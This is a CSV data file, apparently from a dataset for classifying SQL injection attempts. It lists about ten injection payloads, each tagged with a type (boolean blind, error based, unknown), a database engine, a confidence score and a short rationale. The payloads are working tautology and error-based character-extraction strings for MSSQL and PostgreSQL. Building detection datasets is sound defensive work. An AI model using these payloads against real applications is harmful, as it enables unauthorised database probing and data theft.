id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
38944,"select * from users WHERE username = ""1"" or username = ""1\' where 8537 = 8537",boolean_blind,generic,0.70,Boolean Blind detected: SQL structure with complex syn,1
38945,"select * from users WHERE username = ""-1190\' and \'yxry\' like \'yxry"" and username = ""-8112\' ) ) ) and ( ( ( \'xopg\' = \'xopg"" or username = ""1\' )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38946,"select * from users WHERE username = ""-7951\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and username = ""-2348 ) as sige where 1639 = 1639",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
38947,"-8007\' ) ) as bgpp where 9555 = 9555 or username = ""1",unknown,generic,0.50,Insufficient data to classify payload type,1
38948,"-7430\' ) as xfah where 1596 = 1596 and username = ""-7199\' and username = ""-6203\' ) ) ) and ( ( ( \'luee\' = \'luee",unknown,generic,0.50,Insufficient data to classify payload type,1
38949,"select * from users WHERE username = ""-4248 where 3288 = 3288 and username = ""1%\' ) and username = ""-2756\' where 6156 = 6156 and username = ""-4610\' ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
38950,"select * from users WHERE username = ""1 ) ) or username = ""-5352%\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
38951,-6661\' ) ) || 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( \'tbmu\' like \'tbmu,error_based,mssql,0.85,Error Based detected: character extraction (mssql),1
38952,-2348 ) as sige where 1639 = 1639 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --,error_based,postgresql,0.85,Error Based detected: character extraction (postgresql),1
38953,"select * from users WHERE username = ""-9847%\' ) ) ) and ( ( ( \'%\' = \'"" or username = ""-4610\' ) )",boolean_blind,generic,0.75,Boolean Blind detected: SQL structure with complex syn,1
